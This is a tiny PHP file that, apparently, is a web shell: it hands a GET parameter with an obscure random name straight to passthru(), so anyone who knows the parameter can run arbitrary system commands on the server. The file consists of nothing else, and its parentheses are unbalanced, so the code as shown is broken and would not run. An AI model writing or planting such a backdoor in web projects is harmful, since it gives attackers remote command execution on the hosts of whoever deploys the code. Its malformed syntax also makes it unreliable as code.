<?php
passthru(($_GET['R_KsiQLi']);
?>
